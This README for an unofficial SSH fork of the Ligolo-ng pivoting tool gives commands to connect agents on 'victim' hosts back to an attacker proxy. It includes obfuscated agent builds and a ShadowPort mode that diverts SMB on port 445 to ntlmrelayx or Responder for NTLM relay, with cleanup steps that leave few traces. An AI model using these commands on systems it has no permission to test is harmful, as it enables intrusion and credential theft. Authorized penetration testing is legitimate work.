# Ligolo-ng SSH fork - quick commands

This is an independent fork of
[nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng). Ligolo-ng was
created by [Nicolas Chatelain (@nicocha30)](https://github.com/nicocha30), who
deserves full credit for the original project and core tunneling engine. This
SSH fork is not an official upstream release.

This release contains proxy and agent binaries for Windows/Linux AMD64/ARM64.
The Garble agent accepts the same flags as the normal agent. The Windows AMD64
directory also contains `agent-shadow.exe` and `agent-shadow-garble.exe`.

SSH is the real agent-to-proxy transport. The proxy always needs an SSH host
key because it is required to establish an encrypted SSH connection. In
no-auth mode, the victim only needs the agent binary: no agent key file is
required.

## Generate keys on the proxy

PowerShell:

```powershell
New-Item -ItemType Directory -Force .\keys
ssh-keygen -t ed25519 -f .\keys\proxy-host
ssh-keygen -t ed25519 -f .\keys\agent
Copy-Item .\keys\agent.pub .\keys\authorized_keys
ssh-keygen -lf .\keys\proxy-host.pub -E sha256
```

Press Enter twice when `ssh-keygen` asks for an empty passphrase, or set a
passphrase and use the passphrase-environment flags documented below.

Linux:

```bash
mkdir -p ./keys
ssh-keygen -t ed25519 -f ./keys/proxy-host -N ''
ssh-keygen -t ed25519 -f ./keys/agent -N ''
cp ./keys/agent.pub ./keys/authorized_keys
ssh-keygen -lf ./keys/proxy-host.pub -E sha256
```

The last command prints the `SHA256:...` fingerprint used by the agent.

## Recommended: with agent key

Proxy on Windows:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-authorized-keys .\keys\authorized_keys
```

Proxy on Linux:

```bash
sudo ./proxy \
  -laddr ssh://0.0.0.0:22 \
  -ssh-user ligolo \
  -ssh-host-key ./keys/proxy-host \
  -ssh-authorized-keys ./keys/authorized_keys
```

Agent on Windows:

```powershell
.\agent.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-key .\agent `
  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
  -retry `
  -reconnect
```

Agent on Linux:

```bash
./agent \
  -connect ssh://PROXY_IP:22 \
  -ssh-user ligolo \
  -ssh-key ./agent-key \
  -ssh-host-key-fingerprint 'SHA256:REPLACE_WITH_PROXY_FINGERPRINT' \
  -retry \
  -reconnect
```

Copy the agent private key to the victim separately only in this authenticated
mode. `agent-garble.exe` or `agent-garble` can replace the normal agent.

## No agent key: victim receives only the binary

No-key mode requires flags on both sides:

- Proxy: `-ssh-insecure-allow-no-auth`
- Normal or ShadowPort agent: `-ssh-insecure-no-auth`

Generate only `proxy-host` on the proxy. Start the proxy with the explicit
no-auth flag:

Windows proxy:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-insecure-allow-no-auth
```

Linux proxy:

```bash
sudo ./proxy \
  -laddr ssh://0.0.0.0:22 \
  -ssh-user ligolo \
  -ssh-host-key ./keys/proxy-host \
  -ssh-insecure-allow-no-auth
```

No-key agent with proxy verification:

```powershell
.\agent.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
  -retry `
  -reconnect
```

Zero-file/zero-pinning agent command:

```powershell
.\agent.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-insecure-ignore-host-key `
  -retry `
  -reconnect
```

Linux uses the same flags:

```bash
./agent \
  -connect ssh://PROXY_IP:22 \
  -ssh-user ligolo \
  -ssh-insecure-no-auth \
  -ssh-insecure-ignore-host-key \
  -retry \
  -reconnect
```

No-auth mode still uses a real encrypted SSH handshake and the custom
`ligolo` SSH channel. It does not authenticate the agent. With
`-ssh-insecure-ignore-host-key`, it also does not authenticate the proxy.
Anyone who can reach the proxy can connect, and an active MITM can impersonate
the proxy. Enable this mode only for the assessment window and restrict the
listener with firewall rules when possible.

Both sides must opt in. A no-auth agent is rejected by a normal proxy.

## ShadowPort SMB/445 (Windows AMD64)

Use one of the separate ShadowPort binaries when Windows PID 4 already owns
TCP/445. ShadowPort source-selects inbound SMB, translates it to an internal
port, and carries the accepted stream to the proxy through SSH. It does not
need WebDAV and leaves non-selected sources on the native SMB service.

It needs elevated Administrator, not SYSTEM. The official signed WinDivert
2.2.2 AMD64 driver is embedded and hash-pinned. It is extracted to a randomly
named temporary directory only while a ShadowPort listener is active, the
driver image file is deleted as soon as the driver service has started, and the
remaining files are overwritten with zeros and removed during listener
shutdown. The target needs only the EXE, but Windows still requires the driver
to be materialized temporarily on disk when loaded. The firewall exception is
registered through the native Windows Firewall COM API, without spawning
PowerShell, scoped to the exact internal IP, port, and source allowlist, and
named with a random hex token; it is removed during listener shutdown.

With an SSH agent key:

```powershell
.\agent-shadow.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-key .\agent `
  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
  -allow-shadow-port `
  -retry `
  -reconnect
```

Without an agent key, but with proxy fingerprint verification:

Start the proxy first. This command is shared by normal and ShadowPort agents;
`-allow-shadow-port` belongs only on the ShadowPort agent.

Windows proxy:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-insecure-allow-no-auth
```

Linux proxy:

```bash
sudo ./proxy \
  -laddr ssh://0.0.0.0:22 \
  -ssh-user ligolo \
  -ssh-host-key ./keys/proxy-host \
  -ssh-insecure-allow-no-auth
```

```powershell
.\agent-shadow.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
  -allow-shadow-port `
  -retry `
  -reconnect
```

Binary-only/no pinning:

```powershell
.\agent-shadow.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-insecure-ignore-host-key `
  -allow-shadow-port `
  -retry `
  -reconnect
```

`agent-shadow-garble.exe` uses the same flags.

Run an SMB receiver beside the proxy, for example current Impacket:

```bash
sudo ntlmrelayx.py -ip 127.0.0.1 --smb-port 8445 -smb2support -t ldaps://RELAY_TARGET
```

Responder is also supported:

```bash
sudo responder -I PROXY_INTERFACE -v
```

Point the listener at `PROXY_INTERFACE_IPV4:445` instead of
`127.0.0.1:8445` when using Responder.

Select the agent in the proxy console:

```text
session
listener_add --tcp --addr AGENT_IPV4:445 --to 127.0.0.1:8445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
```

Use the agent's exact IPv4 address, not `0.0.0.0`. Multiple sources/CIDRs are
comma-separated. The internal port must be free on the agent; `--to` selects
the independent proxy-side receiver port. `listener_stop` closes the diversion
and removes its runtime files and firewall rule. The Web UI exposes the same
fields when the agent advertises `shadowport-smb-v1`.

Inspect and verify cleanup from elevated Windows PowerShell:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object LocalPort -In 445,8445 |
  Format-Table LocalAddress,LocalPort,OwningProcess
Get-NetFirewallRule | Where-Object DisplayName -match '^[0-9a-f]{16}$'
Get-ChildItem -Directory -LiteralPath $env:TEMP |
  Where-Object { Test-Path (Join-Path $_.FullName 'WinDivert.dll') }
```

While a listener is active, the firewall query shows one scoped inbound rule
named with 16 hex characters, and the directory query shows one directory
holding `WinDivert.dll`; the driver image file is deleted as soon as the driver
service has started, and a machine-wide `WinDivert` driver service exists only
while a filter handle is open. After `listener_stop`, these queries should be
empty. If the process was forcibly killed, review each rule's port and address
scope (other software can also use hex-only names) and remove only the
feature's residue:

```powershell
Get-NetFirewallRule | Where-Object DisplayName -match '^[0-9a-f]{16}$' |
  Remove-NetFirewallRule
Get-ChildItem -Directory -LiteralPath $env:TEMP |
  Where-Object { Test-Path (Join-Path $_.FullName 'WinDivert.dll') } |
  Remove-Item -Recurse -Force
```

## Web UI

The Web UI manages key-authenticated and no-auth SSH agents identically.
Enable it in `ligolo-ng.yaml`:

```yaml
web:
  enabled: true
  enableui: true
  listen: 127.0.0.1:8080
```

Start the proxy with the chosen SSH authentication mode plus:

```text
-daemon -config ./ligolo-ng.yaml -api-laddr 127.0.0.1:8080
```

Open `http://127.0.0.1:8080`. Change the default Web credentials and keep the
API/UI on localhost or behind a trusted reverse proxy.

## SSH-specific flags

Proxy:

```text
-ssh-user
-ssh-host-key
-ssh-host-key-passphrase-env
-ssh-authorized-keys
-ssh-insecure-allow-no-auth
-ssh-handshake-timeout
```

Agent:

```text
-ssh-user
-ssh-key
-ssh-key-passphrase-env
-ssh-known-hosts
-ssh-host-key-fingerprint
-ssh-insecure-ignore-host-key
-ssh-insecure-no-auth
-ssh-connect-timeout
-ssh-keepalive
```

Port 22 may require Administrator/root and may conflict with OpenSSH. Any
allowed port can be used, for example `ssh://0.0.0.0:2222`.

Detailed evidence and caveats are in `../artifacts/TEST-REPORT.md` in the
project workspace.
